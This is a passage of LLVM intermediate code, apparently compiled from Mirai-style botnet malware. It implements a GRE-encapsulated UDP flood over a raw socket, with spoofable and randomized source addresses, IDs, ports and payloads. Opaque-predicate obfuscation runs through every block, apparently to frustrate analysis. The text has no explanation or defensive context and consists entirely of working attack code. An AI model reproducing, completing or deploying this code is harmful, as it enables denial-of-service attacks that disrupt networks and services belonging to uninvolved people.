  %57 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 6, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %18, align 2
  %60 = load i8, i8* %9, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 7, i32 65535)
  %63 = trunc i32 %62 to i16
  store i16 %63, i16* %19, align 2
  %64 = load i8, i8* %9, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 0, i32 512)
  store i32 %66, i32* %20, align 4
  %67 = load i8, i8* %9, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %69 = call i32 @attack_get_opt_int(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 1, i32 1)
  %70 = trunc i32 %69 to i8
  store i8 %70, i8* %21, align 1
  %71 = load i8, i8* %9, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 18, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %22, align 1
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = load i32, i32* @LOCAL_ADDR, align 4
  %78 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 24, i32 %77)
  store i32 %78, i32* %23, align 4
  %79 = call i64 @time(i64* null) #6
  %80 = load i32, i32* %6, align 4
  %81 = sext i32 %80 to i64
  %82 = add nsw i64 %79, %81
  %83 = trunc i64 %82 to i32
  store i32 %83, i32* %24, align 4
  %84 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %84, i32* %12, align 4
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %86, label %87

; <label>:86:                                     ; preds = %5
  br label %675

; <label>:87:                                     ; preds = %5
  %88 = load i32, i32* @x.19
  %89 = load i32, i32* @y.20
  %90 = sub i32 %88, 1
  %91 = mul i32 %88, %90
  %92 = urem i32 %91, 2
  %93 = icmp eq i32 %92, 0
  %94 = icmp slt i32 %89, 10
  %95 = or i1 %93, %94
  br i1 %95, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %87
  store i32 1, i32* %11, align 4
  %96 = load i32, i32* %12, align 4
  %97 = bitcast i32* %11 to i8*
  %98 = call i32 @setsockopt(i32 %96, i32 0, i32 3, i8* %97, i32 4) #6
  %99 = icmp eq i32 %98, -1
  %100 = load i32, i32* @x.19
  %101 = load i32, i32* @y.20
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %99, label %108, label %111

; <label>:108:                                    ; preds = %originalBBpart2
  %109 = load i32, i32* %12, align 4
  %110 = call i32 @close(i32 %109)
  br label %675

; <label>:111:                                    ; preds = %originalBBpart2
  store i32 0, i32* %11, align 4
  br label %112

; <label>:112:                                    ; preds = %326, %111
  %113 = load i32, i32* @x.19
  %114 = load i32, i32* @y.20
  %115 = sub i32 %113, 1
  %116 = mul i32 %113, %115
  %117 = urem i32 %116, 2
  %118 = icmp eq i32 %117, 0
  %119 = icmp slt i32 %114, 10
  %120 = or i1 %118, %119
  br i1 %120, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %112
  %121 = load i32, i32* %11, align 4
  %122 = load i8, i8* %7, align 1
  %123 = zext i8 %122 to i32
  %124 = icmp slt i32 %121, %123
  %125 = load i32, i32* @x.19
  %126 = load i32, i32* @y.20
  %127 = sub i32 %125, 1
  %128 = mul i32 %125, %127
  %129 = urem i32 %128, 2
  %130 = icmp eq i32 %129, 0
  %131 = icmp slt i32 %126, 10
  %132 = or i1 %130, %131
  br i1 %132, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %124, label %133, label %329

; <label>:133:                                    ; preds = %originalBBpart24
  %134 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %135 = load i8**, i8*** %13, align 8
  %136 = load i32, i32* %11, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds i8*, i8** %135, i64 %137
  store i8* %134, i8** %138, align 8
  %139 = load i8**, i8*** %13, align 8
  %140 = load i32, i32* %11, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds i8*, i8** %139, i64 %141
  %143 = load i8*, i8** %142, align 8
  %144 = bitcast i8* %143 to %struct.iphdr*
  store %struct.iphdr* %144, %struct.iphdr** %25, align 8
  %145 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %146 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %145, i64 1
  %147 = bitcast %struct.iphdr* %146 to %struct.grehdr*
  store %struct.grehdr* %147, %struct.grehdr** %26, align 8
  %148 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %149 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %148, i64 1
  %150 = bitcast %struct.grehdr* %149 to %struct.iphdr*
  store %struct.iphdr* %150, %struct.iphdr** %27, align 8
  %151 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %152 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %151, i64 1
  %153 = bitcast %struct.iphdr* %152 to %struct.udphdr*
  store %struct.udphdr* %153, %struct.udphdr** %28, align 8
  %154 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %155 = bitcast %struct.iphdr* %154 to i8*
  %156 = load i8, i8* %155, align 4
  %157 = and i8 %156, 15
  %158 = or i8 %157, 64
  store i8 %158, i8* %155, align 4
  %159 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %160 = bitcast %struct.iphdr* %159 to i8*
  %161 = load i8, i8* %160, align 4
  %162 = and i8 %161, -16
  %163 = or i8 %162, 5
  store i8 %163, i8* %160, align 4
  %164 = load i8, i8* %14, align 1
  %165 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %166 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %165, i32 0, i32 1
  store i8 %164, i8* %166, align 1
  %167 = load i32, i32* %20, align 4
  %168 = sext i32 %167 to i64
  %169 = add i64 52, %168
  %170 = trunc i64 %169 to i16
  %171 = call zeroext i16 @htons(i16 zeroext %170) #7
  %172 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %173 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %172, i32 0, i32 2
  store i16 %171, i16* %173, align 2
  %174 = load i16, i16* %15, align 2
  %175 = call zeroext i16 @htons(i16 zeroext %174) #7
  %176 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 3
  store i16 %175, i16* %177, align 4
  %178 = load i8, i8* %16, align 1
  %179 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %180 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %179, i32 0, i32 5
  store i8 %178, i8* %180, align 4
  %181 = load i8, i8* %17, align 1
  %182 = icmp ne i8 %181, 0
  br i1 %182, label %183, label %203

; <label>:183:                                    ; preds = %133
  %184 = load i32, i32* @x.19
  %185 = load i32, i32* @y.20
  %186 = sub i32 %184, 1
  %187 = mul i32 %184, %186
  %188 = urem i32 %187, 2
  %189 = icmp eq i32 %188, 0
  %190 = icmp slt i32 %185, 10
  %191 = or i1 %189, %190
  br i1 %191, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %183
  %192 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %193 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %194 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %193, i32 0, i32 4
  store i16 %192, i16* %194, align 2
  %195 = load i32, i32* @x.19
  %196 = load i32, i32* @y.20
  %197 = sub i32 %195, 1
  %198 = mul i32 %195, %197
  %199 = urem i32 %198, 2
  %200 = icmp eq i32 %199, 0
  %201 = icmp slt i32 %196, 10
  %202 = or i1 %200, %201
  br i1 %202, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %203

; <label>:203:                                    ; preds = %originalBBpart28, %133
  %204 = load i32, i32* @x.19
  %205 = load i32, i32* @y.20
  %206 = sub i32 %204, 1
  %207 = mul i32 %204, %206
  %208 = urem i32 %207, 2
  %209 = icmp eq i32 %208, 0
  %210 = icmp slt i32 %205, 10
  %211 = or i1 %209, %210
  br i1 %211, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %203
  %212 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %213 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %212, i32 0, i32 6
  store i8 47, i8* %213, align 1
  %214 = load i32, i32* %23, align 4
  %215 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %216 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %215, i32 0, i32 8
  store i32 %214, i32* %216, align 4
  %217 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %218 = load i32, i32* %11, align 4
  %219 = sext i32 %218 to i64
  %220 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %217, i64 %219
  %221 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %220, i32 0, i32 1
  %222 = load i32, i32* %221, align 4
  %223 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %224 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %223, i32 0, i32 9
  store i32 %222, i32* %224, align 4
  %225 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %226 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %227 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %226, i32 0, i32 1
  store i16 %225, i16* %227, align 2
  %228 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %229 = bitcast %struct.iphdr* %228 to i8*
  %230 = load i8, i8* %229, align 4
  %231 = and i8 %230, 15
  %232 = or i8 %231, 64
  store i8 %232, i8* %229, align 4
  %233 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %234 = bitcast %struct.iphdr* %233 to i8*
  %235 = load i8, i8* %234, align 4
  %236 = and i8 %235, -16
  %237 = or i8 %236, 5
  store i8 %237, i8* %234, align 4
  %238 = load i8, i8* %14, align 1
  %239 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %240 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %239, i32 0, i32 1
  store i8 %238, i8* %240, align 1
  %241 = load i32, i32* %20, align 4
  %242 = sext i32 %241 to i64
  %243 = add i64 28, %242
  %244 = trunc i64 %243 to i16
  %245 = call zeroext i16 @htons(i16 zeroext %244) #7
  %246 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %247 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %246, i32 0, i32 2
  store i16 %245, i16* %247, align 2
  %248 = load i16, i16* %15, align 2
  %249 = zext i16 %248 to i32
  %250 = xor i32 %249, -1
  %251 = trunc i32 %250 to i16
  %252 = call zeroext i16 @htons(i16 zeroext %251) #7
  %253 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %254 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %253, i32 0, i32 3
  store i16 %252, i16* %254, align 4
  %255 = load i8, i8* %16, align 1
  %256 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %257 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %256, i32 0, i32 5
  store i8 %255, i8* %257, align 4
  %258 = load i8, i8* %17, align 1
  %259 = icmp ne i8 %258, 0
  %260 = load i32, i32* @x.19
  %261 = load i32, i32* @y.20
  %262 = sub i32 %260, 1
  %263 = mul i32 %260, %262
  %264 = urem i32 %263, 2
  %265 = icmp eq i32 %264, 0
  %266 = icmp slt i32 %261, 10
  %267 = or i1 %265, %266
  br i1 %267, label %originalBBpart250, label %originalBB10alteredBB

originalBBpart250:                                ; preds = %originalBB10
  br i1 %259, label %268, label %272

; <label>:268:                                    ; preds = %originalBBpart250
  %269 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %270 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %271 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %270, i32 0, i32 4
  store i16 %269, i16* %271, align 2
  br label %272

; <label>:272:                                    ; preds = %268, %originalBBpart250
  %273 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %274 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %273, i32 0, i32 6
  store i8 17, i8* %274, align 1
  %275 = call i32 @rand_next()
  %276 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %277 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %276, i32 0, i32 8
  store i32 %275, i32* %277, align 4
  %278 = load i8, i8* %22, align 1
  %279 = icmp ne i8 %278, 0
  br i1 %279, label %280, label %286

; <label>:280:                                    ; preds = %272
  %281 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %282 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %281, i32 0, i32 9
  %283 = load i32, i32* %282, align 4
  %284 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %285 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %284, i32 0, i32 9
  store i32 %283, i32* %285, align 4
  br label %310

; <label>:286:                                    ; preds = %272
  %287 = load i32, i32* @x.19
  %288 = load i32, i32* @y.20
  %289 = sub i32 %287, 1
  %290 = mul i32 %287, %289
  %291 = urem i32 %290, 2
  %292 = icmp eq i32 %291, 0
  %293 = icmp slt i32 %288, 10
  %294 = or i1 %292, %293
  br i1 %294, label %originalBB52, label %originalBB52alteredBB

originalBB52:                                     ; preds = %originalBB52alteredBB, %286
  %295 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %296 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %295, i32 0, i32 8
  %297 = load i32, i32* %296, align 4
  %298 = sub i32 %297, 1024
  %299 = xor i32 %298, -1
  %300 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %301 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %300, i32 0, i32 9
  store i32 %299, i32* %301, align 4
  %302 = load i32, i32* @x.19
  %303 = load i32, i32* @y.20
  %304 = sub i32 %302, 1
  %305 = mul i32 %302, %304
  %306 = urem i32 %305, 2
  %307 = icmp eq i32 %306, 0
  %308 = icmp slt i32 %303, 10
  %309 = or i1 %307, %308
  br i1 %309, label %originalBBpart273, label %originalBB52alteredBB

originalBBpart273:                                ; preds = %originalBB52
  br label %310

; <label>:310:                                    ; preds = %originalBBpart273, %280
  %311 = load i16, i16* %18, align 2
  %312 = call zeroext i16 @htons(i16 zeroext %311) #7
  %313 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %314 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %313, i32 0, i32 0
  store i16 %312, i16* %314, align 2
  %315 = load i16, i16* %19, align 2
  %316 = call zeroext i16 @htons(i16 zeroext %315) #7
  %317 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %318 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %317, i32 0, i32 1
  store i16 %316, i16* %318, align 2
  %319 = load i32, i32* %20, align 4
  %320 = sext i32 %319 to i64
  %321 = add i64 8, %320
  %322 = trunc i64 %321 to i16
  %323 = call zeroext i16 @htons(i16 zeroext %322) #7
  %324 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %325 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %324, i32 0, i32 2
  store i16 %323, i16* %325, align 2
  br label %326

; <label>:326:                                    ; preds = %310
  %327 = load i32, i32* %11, align 4
  %328 = add nsw i32 %327, 1
  store i32 %328, i32* %11, align 4
  br label %112

; <label>:329:                                    ; preds = %originalBBpart24
  %330 = load i32, i32* @x.19
  %331 = load i32, i32* @y.20
  %332 = sub i32 %330, 1
  %333 = mul i32 %330, %332
  %334 = urem i32 %333, 2
  %335 = icmp eq i32 %334, 0
  %336 = icmp slt i32 %331, 10
  %337 = or i1 %335, %336
  br i1 %337, label %originalBB75, label %originalBB75alteredBB

originalBB75:                                     ; preds = %originalBB75alteredBB, %329
  %338 = load i32, i32* @x.19
  %339 = load i32, i32* @y.20
  %340 = sub i32 %338, 1
  %341 = mul i32 %338, %340
  %342 = urem i32 %341, 2
  %343 = icmp eq i32 %342, 0
  %344 = icmp slt i32 %339, 10
  %345 = or i1 %343, %344
  br i1 %345, label %originalBBpart277, label %originalBB75alteredBB

originalBBpart277:                                ; preds = %originalBB75
  br label %346

; <label>:346:                                    ; preds = %674, %originalBBpart277
  store i32 0, i32* %11, align 4
  br label %347

; <label>:347:                                    ; preds = %649, %346
  %348 = load i32, i32* @x.19
  %349 = load i32, i32* @y.20
  %350 = sub i32 %348, 1
  %351 = mul i32 %348, %350
  %352 = urem i32 %351, 2
  %353 = icmp eq i32 %352, 0
  %354 = icmp slt i32 %349, 10
  %355 = or i1 %353, %354
  br i1 %355, label %originalBB79, label %originalBB79alteredBB

originalBB79:                                     ; preds = %originalBB79alteredBB, %347
  %356 = load i32, i32* %11, align 4
  %357 = load i8, i8* %7, align 1
  %358 = zext i8 %357 to i32
  %359 = icmp slt i32 %356, %358
  %360 = load i32, i32* @x.19
  %361 = load i32, i32* @y.20
  %362 = sub i32 %360, 1
  %363 = mul i32 %360, %362
  %364 = urem i32 %363, 2
  %365 = icmp eq i32 %364, 0
  %366 = icmp slt i32 %361, 10
  %367 = or i1 %365, %366
  br i1 %367, label %originalBBpart281, label %originalBB79alteredBB

originalBBpart281:                                ; preds = %originalBB79
  br i1 %359, label %368, label %652

; <label>:368:                                    ; preds = %originalBBpart281
  %369 = load i32, i32* @x.19
  %370 = load i32, i32* @y.20
  %371 = sub i32 %369, 1
  %372 = mul i32 %369, %371
  %373 = urem i32 %372, 2
  %374 = icmp eq i32 %373, 0
  %375 = icmp slt i32 %370, 10
  %376 = or i1 %374, %375
  br i1 %376, label %originalBB83, label %originalBB83alteredBB

originalBB83:                                     ; preds = %originalBB83alteredBB, %368
  %377 = load i8**, i8*** %13, align 8
  %378 = load i32, i32* %11, align 4
  %379 = sext i32 %378 to i64
  %380 = getelementptr inbounds i8*, i8** %377, i64 %379
  %381 = load i8*, i8** %380, align 8
  store i8* %381, i8** %29, align 8
  %382 = load i8*, i8** %29, align 8
  %383 = bitcast i8* %382 to %struct.iphdr*
  store %struct.iphdr* %383, %struct.iphdr** %30, align 8
  %384 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %385 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %384, i64 1
  %386 = bitcast %struct.iphdr* %385 to %struct.grehdr*
  store %struct.grehdr* %386, %struct.grehdr** %31, align 8
  %387 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %388 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %387, i64 1
  %389 = bitcast %struct.grehdr* %388 to %struct.iphdr*
  store %struct.iphdr* %389, %struct.iphdr** %32, align 8
  %390 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %391 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %390, i64 1
  %392 = bitcast %struct.iphdr* %391 to %struct.udphdr*
  store %struct.udphdr* %392, %struct.udphdr** %33, align 8
  %393 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %394 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %393, i64 1
  %395 = bitcast %struct.udphdr* %394 to i8*
  store i8* %395, i8** %34, align 8
  %396 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %397 = load i32, i32* %11, align 4
  %398 = sext i32 %397 to i64
  %399 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %396, i64 %398
  %400 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %399, i32 0, i32 2
  %401 = load i8, i8* %400, align 4
  %402 = zext i8 %401 to i32
  %403 = icmp slt i32 %402, 32
  %404 = load i32, i32* @x.19
  %405 = load i32, i32* @y.20
  %406 = sub i32 %404, 1
  %407 = mul i32 %404, %406
  %408 = urem i32 %407, 2
  %409 = icmp eq i32 %408, 0
  %410 = icmp slt i32 %405, 10
  %411 = or i1 %409, %410
  br i1 %411, label %originalBBpart285, label %originalBB83alteredBB

originalBBpart285:                                ; preds = %originalBB83
  br i1 %403, label %412, label %449

; <label>:412:                                    ; preds = %originalBBpart285
  %413 = load i32, i32* @x.19
  %414 = load i32, i32* @y.20
  %415 = sub i32 %413, 1
  %416 = mul i32 %413, %415
  %417 = urem i32 %416, 2
  %418 = icmp eq i32 %417, 0
  %419 = icmp slt i32 %414, 10
  %420 = or i1 %418, %419
  br i1 %420, label %originalBB87, label %originalBB87alteredBB

originalBB87:                                     ; preds = %originalBB87alteredBB, %412
  %421 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %422 = load i32, i32* %11, align 4
  %423 = sext i32 %422 to i64
  %424 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %421, i64 %423
  %425 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %424, i32 0, i32 1
  %426 = load i32, i32* %425, align 4
  %427 = call i32 @ntohl(i32 %426) #7
  %428 = call i32 @rand_next()
  %429 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %430 = load i32, i32* %11, align 4
  %431 = sext i32 %430 to i64
  %432 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %429, i64 %431
  %433 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %432, i32 0, i32 2
  %434 = load i8, i8* %433, align 4
  %435 = zext i8 %434 to i32
  %436 = lshr i32 %428, %435
  %437 = add i32 %427, %436
  %438 = call i32 @htonl(i32 %437) #7
  %439 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %440 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %439, i32 0, i32 9
  store i32 %438, i32* %440, align 4
  %441 = load i32, i32* @x.19
  %442 = load i32, i32* @y.20
  %443 = sub i32 %441, 1
  %444 = mul i32 %441, %443
  %445 = urem i32 %444, 2
  %446 = icmp eq i32 %445, 0
  %447 = icmp slt i32 %442, 10
  %448 = or i1 %446, %447
  br i1 %448, label %originalBBpart2108, label %originalBB87alteredBB

originalBBpart2108:                               ; preds = %originalBB87
  br label %449

; <label>:449:                                    ; preds = %originalBBpart2108, %originalBBpart285
  %450 = load i32, i32* %23, align 4
  %451 = icmp eq i32 %450, -1
  br i1 %451, label %452, label %456

; <label>:452:                                    ; preds = %449
  %453 = call i32 @rand_next()
  %454 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %455 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %454, i32 0, i32 8
  store i32 %453, i32* %455, align 4
  br label %456

; <label>:456:                                    ; preds = %452, %449
  %457 = load i16, i16* %15, align 2
  %458 = zext i16 %457 to i32
  %459 = icmp eq i32 %458, 65535
  br i1 %459, label %460, label %475

; <label>:460:                                    ; preds = %456
  %461 = call i32 @rand_next()
  %462 = and i32 %461, 65535
  %463 = trunc i32 %462 to i16
  %464 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %465 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %464, i32 0, i32 3
  store i16 %463, i16* %465, align 4
  %466 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %467 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %466, i32 0, i32 3
  %468 = load i16, i16* %467, align 4
  %469 = zext i16 %468 to i32
  %470 = sub nsw i32 %469, 1000
  %471 = xor i32 %470, -1
  %472 = trunc i32 %471 to i16
  %473 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %474 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %473, i32 0, i32 3
  store i16 %472, i16* %474, align 4
  br label %475

; <label>:475:                                    ; preds = %460, %456
  %476 = load i16, i16* %18, align 2
  %477 = zext i16 %476 to i32
  %478 = icmp eq i32 %477, 65535
  br i1 %478, label %479, label %501

; <label>:479:                                    ; preds = %475
  %480 = load i32, i32* @x.19
  %481 = load i32, i32* @y.20
  %482 = sub i32 %480, 1
  %483 = mul i32 %480, %482
  %484 = urem i32 %483, 2
  %485 = icmp eq i32 %484, 0
  %486 = icmp slt i32 %481, 10
  %487 = or i1 %485, %486
  br i1 %487, label %originalBB110, label %originalBB110alteredBB

originalBB110:                                    ; preds = %originalBB110alteredBB, %479
  %488 = call i32 @rand_next()
  %489 = and i32 %488, 65535
  %490 = trunc i32 %489 to i16
  %491 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %492 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %491, i32 0, i32 0
  store i16 %490, i16* %492, align 2
  %493 = load i32, i32* @x.19
  %494 = load i32, i32* @y.20
  %495 = sub i32 %493, 1
  %496 = mul i32 %493, %495
  %497 = urem i32 %496, 2
  %498 = icmp eq i32 %497, 0
  %499 = icmp slt i32 %494, 10
  %500 = or i1 %498, %499
  br i1 %500, label %originalBBpart2118, label %originalBB110alteredBB

originalBBpart2118:                               ; preds = %originalBB110
  br label %501

; <label>:501:                                    ; preds = %originalBBpart2118, %475
  %502 = load i16, i16* %19, align 2
  %503 = zext i16 %502 to i32
  %504 = icmp eq i32 %503, 65535
  br i1 %504, label %505, label %527

; <label>:505:                                    ; preds = %501
  %506 = load i32, i32* @x.19
  %507 = load i32, i32* @y.20
  %508 = sub i32 %506, 1
  %509 = mul i32 %506, %508
  %510 = urem i32 %509, 2
  %511 = icmp eq i32 %510, 0
  %512 = icmp slt i32 %507, 10
  %513 = or i1 %511, %512
  br i1 %513, label %originalBB120, label %originalBB120alteredBB

originalBB120:                                    ; preds = %originalBB120alteredBB, %505
  %514 = call i32 @rand_next()
  %515 = and i32 %514, 65535
  %516 = trunc i32 %515 to i16
  %517 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %518 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %517, i32 0, i32 1
  store i16 %516, i16* %518, align 2
  %519 = load i32, i32* @x.19
  %520 = load i32, i32* @y.20
  %521 = sub i32 %519, 1
  %522 = mul i32 %519, %521
  %523 = urem i32 %522, 2
  %524 = icmp eq i32 %523, 0
  %525 = icmp slt i32 %520, 10
  %526 = or i1 %524, %525
  br i1 %526, label %originalBBpart2127, label %originalBB120alteredBB

originalBBpart2127:                               ; preds = %originalBB120
  br label %527

; <label>:527:                                    ; preds = %originalBBpart2127, %501
  %528 = load i32, i32* @x.19
  %529 = load i32, i32* @y.20
  %530 = sub i32 %528, 1
  %531 = mul i32 %528, %530
  %532 = urem i32 %531, 2
  %533 = icmp eq i32 %532, 0
  %534 = icmp slt i32 %529, 10
  %535 = or i1 %533, %534
  br i1 %535, label %originalBB129, label %originalBB129alteredBB

originalBB129:                                    ; preds = %originalBB129alteredBB, %527
  %536 = load i8, i8* %22, align 1
  %537 = icmp ne i8 %536, 0
  %538 = load i32, i32* @x.19
  %539 = load i32, i32* @y.20
  %540 = sub i32 %538, 1
  %541 = mul i32 %538, %540
  %542 = urem i32 %541, 2
  %543 = icmp eq i32 %542, 0
  %544 = icmp slt i32 %539, 10
  %545 = or i1 %543, %544
  br i1 %545, label %originalBBpart2131, label %originalBB129alteredBB

originalBBpart2131:                               ; preds = %originalBB129
  br i1 %537, label %550, label %546

; <label>:546:                                    ; preds = %originalBBpart2131
  %547 = call i32 @rand_next()
  %548 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %549 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %548, i32 0, i32 9
  store i32 %547, i32* %549, align 4
  br label %556

; <label>:550:                                    ; preds = %originalBBpart2131
  %551 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %552 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %551, i32 0, i32 9
  %553 = load i32, i32* %552, align 4
  %554 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %555 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %554, i32 0, i32 9
  store i32 %553, i32* %555, align 4
  br label %556

; <label>:556:                                    ; preds = %550, %546
  %557 = load i8, i8* %21, align 1
  %558 = icmp ne i8 %557, 0
  br i1 %558, label %559, label %566

; <label>:559:                                    ; preds = %556
  %560 = load i8*, i8** %34, align 8
  %561 = load i32, i32* %20, align 4
  call void @rand_alphastr(i8* %560, i32 %561)
  %562 = load i8*, i8** %34, align 8
  %563 = load i32, i32* %20, align 4
  %564 = sext i32 %563 to i64
  %565 = getelementptr inbounds i8, i8* %562, i64 %564
  store i8 0, i8* %565, align 1
  br label %566

; <label>:566:                                    ; preds = %559, %556
  %567 = load i32, i32* @x.19
  %568 = load i32, i32* @y.20
  %569 = sub i32 %567, 1
  %570 = mul i32 %567, %569
  %571 = urem i32 %570, 2
  %572 = icmp eq i32 %571, 0
  %573 = icmp slt i32 %568, 10
  %574 = or i1 %572, %573
  br i1 %574, label %originalBB133, label %originalBB133alteredBB

originalBB133:                                    ; preds = %originalBB133alteredBB, %566
  %575 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %576 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %575, i32 0, i32 7
  store i16 0, i16* %576, align 2
  %577 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %578 = bitcast %struct.iphdr* %577 to i16*
  %579 = call zeroext i16 @checksum_generic(i16* %578, i32 20)
  %580 = load %struct.iphdr*, %struct.iphdr** %30, align 8
